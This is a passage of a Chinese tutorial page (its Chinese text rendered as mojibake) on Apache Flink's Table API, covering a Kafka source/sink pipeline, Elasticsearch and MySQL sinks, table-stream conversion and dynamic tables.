class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.DataTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Csv;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Kafka;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.descriptors.Schema;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 6:33 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest4_KafkaPipeLine</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¿æ¥Kafkaï¼Œè¯»å–æ•°æ®</span></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> Kafka()</span><br><span class="line">                     .version(<span class="string">&quot;universal&quot;</span>)</span><br><span class="line">                     .topic(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;zookeeper.connect&quot;</span>, <span class="string">&quot;localhost:2181&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>)</span><br><span class="line">                    )</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  .field(<span class="string">&quot;timestamp&quot;</span>, DataTypes.BIGINT())</span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æŸ¥è¯¢è½¬æ¢</span></span><br><span class="line">    <span class="comment">// ç®€å•è½¬æ¢</span></span><br><span class="line">    Table sensorTable = tableEnv.from(<span class="string">&quot;inputTable&quot;</span>);</span><br><span class="line">    Table resultTable = sensorTable.select(<span class="string">&quot;id, temp&quot;</span>)</span><br><span class="line">      .filter(<span class="string">&quot;id === &#x27;sensor_6&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èšåˆç»Ÿè®¡</span></span><br><span class="line">    Table aggTable = sensorTable.groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count as count, temp.avg as avgTemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å»ºç«‹kafkaè¿æ¥ï¼Œè¾“å‡ºåˆ°ä¸åŒçš„topicä¸‹</span></span><br><span class="line">    tableEnv.connect(<span class="keyword">new</span> Kafka()</span><br><span class="line">                     .version(<span class="string">&quot;universal&quot;</span>)</span><br><span class="line">                     .topic(<span class="string">&quot;sinktest&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;zookeeper.connect&quot;</span>, <span class="string">&quot;localhost:2181&quot;</span>)</span><br><span class="line">                     .property(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>)</span><br><span class="line">                    )</span><br><span class="line">      .withFormat(<span class="keyword">new</span> Csv())</span><br><span class="line">      .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">                  .field(<span class="string">&quot;id&quot;</span>, DataTypes.STRING())</span><br><span class="line">                  <span class="comment">//                        .field(&quot;timestamp&quot;, DataTypes.BIGINT())</span></span><br><span class="line">                  .field(<span class="string">&quot;temp&quot;</span>, DataTypes.DOUBLE())</span><br><span class="line">                 )</span><br><span class="line">      .createTemporaryTable(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    resultTable.insertInto(<span class="string">&quot;outputTable&quot;</span>);</span><br><span class="line"></span><br><span class="line">    tableEnv.execute(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaç›®å½•é‡Œè‡ªå¸¦çš„zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaæœåŠ¡  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> æ–°å»ºkafkaç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic sinktest</span></span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨Flinkç¨‹åºï¼Œåœ¨kafkaç”Ÿäº§è€…consoleä¸­è¾“å…¥æ•°æ®ï¼ŒæŸ¥çœ‹è¾“å‡º </p><ul><li><p> è¾“å…¥ï¼ˆkafka-console-producerï¼‰  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_7,1547718202,6.7</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_10,1547718205,38.1</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718209,34.5</span></span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºï¼ˆkafka-console-consumerï¼‰<br>ä»£ç ä¸­ï¼Œåªç­›é€‰idä¸º<code>sensor_6</code>çš„ï¼Œæ‰€ä»¥è¾“å‡ºæ²¡æœ‰é—®é¢˜  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sensor_6,15.4           </span><br><span class="line"></span><br><span class="line">sensor_6,34.5</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="æ›´æ–°æ¨¡å¼"><a href="#æ›´æ–°æ¨¡å¼" class="headerlink" title="æ›´æ–°æ¨¡å¼"></a>æ›´æ–°æ¨¡å¼</h5><ul><li>å¯¹äºæµå¼æŸ¥è¯¢ï¼Œéœ€è¦å£°æ˜å¦‚ä½•åœ¨è¡¨å’Œå¤–éƒ¨è¿æ¥å™¨ä¹‹é—´æ‰§è¡Œè½¬æ¢</li><li>ä¸å¤–éƒ¨ç³»ç»Ÿäº¤æ¢çš„æ¶ˆæ¯ç±»å‹ï¼Œç”±æ›´æ–°æ¨¡å¼ï¼ˆUadate Modeï¼‰æŒ‡å®š</li><li>è¿½åŠ ï¼ˆAppendï¼‰æ¨¡å¼ <ul><li>è¡¨åªåšæ’å…¥æ“ä½œï¼Œå’Œå¤–éƒ¨è¿æ¥å™¨åªäº¤æ¢æ’å…¥ï¼ˆInsertï¼‰æ¶ˆæ¯</li></ul></li><li>æ’¤å›ï¼ˆRetractï¼‰æ¨¡å¼ <ul><li>è¡¨å’Œå¤–éƒ¨è¿æ¥å™¨äº¤æ¢æ·»åŠ ï¼ˆAddï¼‰å’Œæ’¤å›ï¼ˆRetractï¼‰æ¶ˆæ¯</li><li>æ’å…¥æ“ä½œï¼ˆInsertï¼‰ç¼–ç ä¸ºAddæ¶ˆæ¯ï¼›åˆ é™¤ï¼ˆDeleteï¼‰ç¼–ç ä¸ºRetractæ¶ˆæ¯ï¼›<strong>æ›´æ–°ï¼ˆUpdateï¼‰ç¼–ç ä¸ºä¸Šä¸€æ¡çš„Retractå’Œä¸‹ä¸€æ¡çš„Addæ¶ˆæ¯</strong></li></ul></li><li>æ›´æ–°æ’å…¥ï¼ˆUpsertï¼‰æ¨¡å¼ <ul><li>æ›´æ–°å’Œæ’å…¥éƒ½è¢«ç¼–ç ä¸ºUpsertæ¶ˆæ¯ï¼›åˆ é™¤ç¼–ç ä¸ºDeleteæ¶ˆæ¯</li></ul></li></ul><h5 id="è¾“å‡ºåˆ°ES"><a href="#è¾“å‡ºåˆ°ES" class="headerlink" title="è¾“å‡ºåˆ°ES"></a>è¾“å‡ºåˆ°ES</h5><ul><li> å¯ä»¥åˆ›å»ºTableæ¥æè¿°ESä¸­çš„æ•°æ®ï¼Œä½œä¸ºè¾“å‡ºçš„TableSink  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.connect(</span><br><span class="line">  <span class="keyword">new</span> Elasticsearch()</span><br><span class="line">  .version(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">  .host(<span class="string">&quot;localhost&quot;</span>,<span class="number">9200</span>,<span class="string">&quot;http&quot;</span>)</span><br><span class="line">  .index(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">  .documentType(<span class="string">&quot;temp&quot;</span>)</span><br><span class="line">)</span><br><span class="line">  .inUpsertMode()</span><br><span class="line">  .withFormat(<span class="keyword">new</span> Json())</span><br><span class="line">  .withSchema(<span class="keyword">new</span> Schema()</span><br><span class="line">              .field(<span class="string">&quot;id&quot;</span>,DataTypes.STRING())</span><br><span class="line">              .field(<span class="string">&quot;count&quot;</span>,DataTypes.BIGINT())</span><br><span class="line">             )</span><br><span class="line">  .createTemporaryTable(<span class="string">&quot;esOutputTable&quot;</span>);</span><br><span class="line">aggResultTable.insertInto(<span class="string">&quot;esOutputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="è¾“å‡ºåˆ°MySQL"><a href="#è¾“å‡ºåˆ°MySQL" class="headerlink" title="è¾“å‡ºåˆ°MySQL"></a>è¾“å‡ºåˆ°MySQL</h5><ul><li><p> éœ€è¦çš„pomä¾èµ–<br>Flinkä¸“é—¨ä¸ºTable APIçš„jdbcè¿æ¥æä¾›äº†flink-jdbcè¿æ¥å™¨ï¼Œéœ€è¦å…ˆå¼•å…¥ä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.flink/flink-jdbc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-jdbc_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.10.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> å¯ä»¥åˆ›å»ºTableæ¥æè¿°MySqlä¸­çš„æ•°æ®ï¼Œä½œä¸ºè¾“å…¥å’Œè¾“å‡º  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String sinkDDL = </span><br><span class="line">  <span class="string">&quot;create table jdbcOutputTable (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; id varchar(20) not null, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; cnt bigint not null &quot;</span> +</span><br><span class="line">  <span class="string">&quot;) with (&quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.type&#x27; = &#x27;jdbc&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.url&#x27; = &#x27;jdbc:mysql://localhost:3306/test&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.table&#x27; = &#x27;sensor_count&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.driver&#x27; = &#x27;com.mysql.jdbc.Driver&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.username&#x27; = &#x27;root&#x27;, &quot;</span> +</span><br><span class="line">  <span class="string">&quot; &#x27;connector.password&#x27; = &#x27;123456&#x27; )&quot;</span>;</span><br><span class="line">tableEnv.sqlUpdate(sinkDDL);<span class="comment">// æ‰§è¡ŒDDLåˆ›å»ºè¡¨</span></span><br><span class="line">aggResultSqlTable.insertInto(<span class="string">&quot;jdbcOutputTable&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="è¡¨å’Œæµçš„è½¬æ¢"><a href="#è¡¨å’Œæµçš„è½¬æ¢" class="headerlink" title="è¡¨å’Œæµçš„è½¬æ¢"></a>è¡¨å’Œæµçš„è½¬æ¢</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106479537">Flink- å°†è¡¨è½¬æ¢æˆDataStream | æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ | æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ« | åŠ¨æ€è¡¨ | æµå¼æŒç»­æŸ¥è¯¢çš„è¿‡ç¨‹ | å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨ | æŒç»­æŸ¥è¯¢ | å°†åŠ¨æ€è¡¨è½¬æ¢æˆ DS</a></p></blockquote><h5 id="å°†Tableè½¬æ¢æˆDataStream"><a href="#å°†Tableè½¬æ¢æˆDataStream" class="headerlink" title="å°†Tableè½¬æ¢æˆDataStream"></a>å°†Tableè½¬æ¢æˆDataStream</h5><ul><li><p> è¡¨å¯ä»¥è½¬æ¢ä¸º DataStream æˆ– DataSet ï¼Œè¿™æ ·è‡ªå®šä¹‰æµå¤„ç†æˆ–æ‰¹å¤„ç†ç¨‹åºå°±å¯ä»¥ç»§ç»­åœ¨ Table API æˆ– SQL æŸ¥è¯¢çš„ç»“æœä¸Šè¿è¡Œäº† </p></li><li><p> å°†è¡¨è½¬æ¢ä¸º DataStream æˆ– DataSet æ—¶ï¼Œéœ€è¦æŒ‡å®šç”Ÿæˆçš„æ•°æ®ç±»å‹ï¼Œå³è¦å°†è¡¨çš„æ¯ä¸€è¡Œè½¬æ¢æˆçš„æ•°æ®ç±»å‹ </p></li><li><p> è¡¨ä½œä¸ºæµå¼æŸ¥è¯¢çš„ç»“æœï¼Œæ˜¯åŠ¨æ€æ›´æ–°çš„ </p></li><li><p> è½¬æ¢æœ‰ä¸¤ç§è½¬æ¢æ¨¡å¼ï¼šè¿½åŠ ï¼ˆAppendeï¼‰æ¨¡å¼å’Œæ’¤å›ï¼ˆRetractï¼‰æ¨¡å¼ </p></li><li><p>è¿½åŠ æ¨¡å¼ </p><ul><li>ç”¨äºè¡¨åªä¼šè¢«æ’å…¥ï¼ˆInsertï¼‰æ“ä½œæ›´æ”¹çš„åœºæ™¯<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Row&gt; resultStream = tableEnv.toAppendStream(resultTable,Row.class);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ’¤å›æ¨¡å¼ </p><ul><li> ç”¨äºä»»ä½•åœºæ™¯ã€‚æœ‰äº›ç±»ä¼¼äºæ›´æ–°æ¨¡å¼ä¸­Retractæ¨¡å¼ï¼Œå®ƒåªæœ‰Insertå’ŒDeleteä¸¤ç±»æ“ä½œã€‚ </li><li> <strong>å¾—åˆ°çš„æ•°æ®ä¼šå¢åŠ ä¸€ä¸ªBooleanç±»å‹çš„æ ‡è¯†ä½ï¼ˆè¿”å›çš„ç¬¬ä¸€ä¸ªå­—æ®µï¼‰ï¼Œç”¨å®ƒæ¥è¡¨ç¤ºåˆ°åº•æ˜¯æ–°å¢çš„æ•°æ®ï¼ˆInsertï¼‰ï¼Œè¿˜æ˜¯è¢«åˆ é™¤çš„æ•°æ®ï¼ˆDeleteï¼‰</strong>ã€‚<br><em>(æ›´æ–°æ•°æ®ï¼Œä¼šå…ˆåˆ é™¤æ—§æ•°æ®ï¼Œå†æ’å…¥æ–°æ•°æ®)</em> </li></ul></li></ul><h5 id="å°†DataStreamè½¬æ¢æˆè¡¨"><a href="#å°†DataStreamè½¬æ¢æˆè¡¨" class="headerlink" title="å°†DataStreamè½¬æ¢æˆè¡¨"></a>å°†DataStreamè½¬æ¢æˆè¡¨</h5><ul><li><p> å¯¹äºä¸€ä¸ªDataStreamï¼Œå¯ä»¥ç›´æ¥è½¬æ¢æˆTableï¼Œè¿›è€Œæ–¹ä¾¿åœ°è°ƒç”¨Table APIåšè½¬æ¢æ“ä½œ  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; dataStream = ...</span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream);</span><br></pre></td></tr></table></figure></li><li><p> é»˜è®¤è½¬æ¢åçš„Table schemaå’ŒDataStreamä¸­çš„å­—æ®µå®šä¹‰ä¸€ä¸€å¯¹åº”ï¼Œä¹Ÿå¯ä»¥å•ç‹¬æŒ‡å®šå‡ºæ¥  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;SensorReading&gt; dataStream = ...</span><br><span class="line">Table sensorTable = tableEnv.fromDataStream(dataStream,</span><br><span class="line">                                           <span class="string">&quot;id, timestamp as ts, temperature&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul><h5 id="åˆ›å»ºä¸´æ—¶è§†å›¾-Temporary-View"><a href="#åˆ›å»ºä¸´æ—¶è§†å›¾-Temporary-View" class="headerlink" title="åˆ›å»ºä¸´æ—¶è§†å›¾(Temporary View)"></a>åˆ›å»ºä¸´æ—¶è§†å›¾(Temporary View)</h5><ul><li><p> åŸºäºDataStreamåˆ›å»ºä¸´æ—¶è§†å›¾  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>,dataStream);</span><br><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>,</span><br><span class="line">                            dataStream, <span class="string">&quot;id, timestamp as ts, temperature&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p> åŸºäºTableåˆ›å»ºä¸´æ—¶è§†å›¾  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableEnv.createTemporaryView(<span class="string">&quot;sensorView&quot;</span>, sensorTable);</span><br></pre></td></tr></table></figure></li></ul><h4 id="æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’"><a href="#æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’" class="headerlink" title="æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’"></a>æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’</h4><ul><li> Table API æä¾›äº†ä¸€ç§æœºåˆ¶æ¥è§£é‡Šè®¡ç®—è¡¨çš„é€»è¾‘å’Œä¼˜åŒ–æŸ¥è¯¢è®¡åˆ’ </li><li>æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ï¼Œå¯ä»¥é€šè¿‡<code>TableEnvironment.explain(table)</code>æ–¹æ³•æˆ–<code>TableEnvironment.explain()</code>æ–¹æ³•å®Œæˆï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæè¿°ä¸‰ä¸ªè®¡åˆ’ <ul><li>ä¼˜åŒ–çš„é€»è¾‘æŸ¥è¯¢è®¡åˆ’</li><li>ä¼˜åŒ–åçš„é€»è¾‘æŸ¥è¯¢è®¡åˆ’</li><li>å®é™…æ‰§è¡Œè®¡åˆ’<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String explaination = tableEnv.explain(resultTable);</span><br><span class="line">System.out.println(explaination);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ«"><a href="#æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ«" class="headerlink" title="æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ«"></a>æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ«</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106479537">Flink- å°†è¡¨è½¬æ¢æˆDataStream | æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’ | æµå¤„ç†å’Œå…³ç³»ä»£æ•°çš„åŒºåˆ« | åŠ¨æ€è¡¨ | æµå¼æŒç»­æŸ¥è¯¢çš„è¿‡ç¨‹ | å°†æµè½¬æ¢æˆåŠ¨æ€è¡¨ | æŒç»­æŸ¥è¯¢ | å°†åŠ¨æ€è¡¨è½¬æ¢æˆ DS</a></p></blockquote><pre><code>Table APIå’ŒSQLï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯åŸºäºå…³ç³»å‹è¡¨çš„æ“ä½œæ–¹å¼ï¼›è€Œå…³ç³»å‹è¡¨ã€å…³ç³»ä»£æ•°ï¼Œä»¥åŠSQLæœ¬èº«ï¼Œä¸€èˆ¬æ˜¯æœ‰ç•Œçš„ï¼Œæ›´é€‚åˆæ‰¹å¤„ç†çš„åœºæ™¯ã€‚è¿™å°±å¯¼è‡´åœ¨è¿›è¡Œæµå¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œç†è§£ä¼šç¨å¾®å¤æ‚ä¸€äº›ï¼Œéœ€è¦å¼•å…¥ä¸€äº›ç‰¹æ®Šæ¦‚å¿µã€‚å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®**å…³ç³»ä»£æ•°ï¼ˆä¸»è¦å°±æ˜¯æŒ‡å…³ç³»å‹æ•°æ®åº“ä¸­çš„è¡¨ï¼‰å’ŒSQLï¼Œä¸»è¦å°±æ˜¯é’ˆå¯¹æ‰¹å¤„ç†çš„ï¼Œè¿™å’Œæµå¤„ç†æœ‰å¤©ç”Ÿçš„éš”é˜‚ã€‚**</code></pre><table><thead><tr><th></th><th>å…³ç³»ä»£æ•°(è¡¨)/SQL</th><th>æµå¤„ç†</th></tr></thead><tbody><tr><td>å¤„ç†çš„æ•°æ®å¯¹è±¡</td><td>å­—æ®µå…ƒç»„çš„æœ‰ç•Œé›†åˆ</td><td>å­—æ®µå…ƒç»„çš„æ— é™åºåˆ—</td></tr><tr><td>æŸ¥è¯¢ï¼ˆQueryï¼‰å¯¹æ•°æ®çš„è®¿é—®</td><td>å¯ä»¥è®¿é—®åˆ°å®Œæ•´çš„æ•°æ®è¾“å…¥</td><td>æ— æ³•è®¿é—®æ‰€æœ‰æ•°æ®ï¼Œå¿…é¡»æŒç»­â€ç­‰å¾…â€æµå¼è¾“å…¥</td></tr><tr><td>æŸ¥è¯¢ç»ˆæ­¢æ¡ä»¶</td><td>ç”Ÿæˆå›ºå®šå¤§å°çš„ç»“æœé›†åç»ˆæ­¢</td><td>æ°¸ä¸åœæ­¢ï¼Œæ ¹æ®æŒç»­æ”¶åˆ°çš„æ•°æ®ä¸æ–­æ›´æ–°æŸ¥è¯¢ç»“æœ</td></tr></tbody></table><h5 id="åŠ¨æ€è¡¨-Dynamic-Tables"><a href="#åŠ¨æ€è¡¨-Dynamic-Tables" class="headerlink" title="åŠ¨æ€è¡¨(Dynamic Tables)"></a>åŠ¨æ€è¡¨(Dynamic Tables)</h5><pre><code>æˆ‘ä»¬å¯ä»¥**éšç€æ–°æ•°æ®çš„åˆ°æ¥ï¼Œä¸åœåœ°åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šæ›´æ–°ç»“æœ**ã€‚è¿™æ ·å¾—åˆ°çš„è¡¨ï¼Œåœ¨Flink Table APIæ¦‚å¿µé‡Œï¼Œå°±å«åšâ€œåŠ¨æ€è¡¨â€ï¼ˆDynamic Tablesï¼‰ã€‚</code></pre><ul><li>åŠ¨æ€è¡¨æ˜¯ Flink å¯¹æµæ•°æ®çš„ Table API å’Œ SQL æ”¯æŒçš„æ ¸å¿ƒæ¦‚å¿µ</li><li>ä¸è¡¨ç¤ºæ‰¹å¤„ç†æ•°æ®çš„é™æ€è¡¨ä¸åŒï¼ŒåŠ¨æ€è¡¨æ˜¯éšæ—¶é—´å˜åŒ–çš„</li><li>æŒç»­æŸ¥è¯¢(Continuous Query) <ul><li>åŠ¨æ€è¡¨å¯ä»¥åƒé™æ€çš„æ‰¹å¤„ç†è¡¨ä¸€æ ·è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä¸€ä¸ªåŠ¨æ€è¡¨ä¼šäº§ç”Ÿ<strong>æŒç»­æŸ¥è¯¢ï¼ˆContinuous Queryï¼‰</strong></li><li><strong>è¿ç»­æŸ¥è¯¢æ°¸è¿œä¸ä¼šç»ˆæ­¢ï¼Œå¹¶ä¼šç”Ÿæˆå¦ä¸€ä¸ªåŠ¨æ€è¡¨</strong></li><li>æŸ¥è¯¢ï¼ˆQueryï¼‰ä¼šä¸æ–­æ›´æ–°å…¶åŠ¨æ€ç»“æœè¡¨ï¼Œä»¥åæ˜ å…¶åŠ¨æ€è¾“å…¥è¡¨ä¸Šçš„æ›´æ”¹ã€‚</li></ul></li></ul><h5 id="åŠ¨æ€è¡¨å’ŒæŒç»­æŸ¥è¯¢"><a href="#åŠ¨æ€è¡¨å’ŒæŒç»­æŸ¥è¯¢" class="headerlink" title="åŠ¨æ€è¡¨å’ŒæŒç»­æŸ¥è¯¢"></a>åŠ¨æ€è¡¨å’ŒæŒç»­æŸ¥è¯¢</h5><p><img src="https://img-blog.csdnimg.cn/20200601190927869.png###id=wWyXo&originHeight=140&originWidth=867&originalType=binary&ratio=1&status=done&style=none"></p><p>æµå¼è¡¨æŸ¥è¯¢çš„å¤„ç†è¿‡ç¨‹ï¼š</p><ol><li> 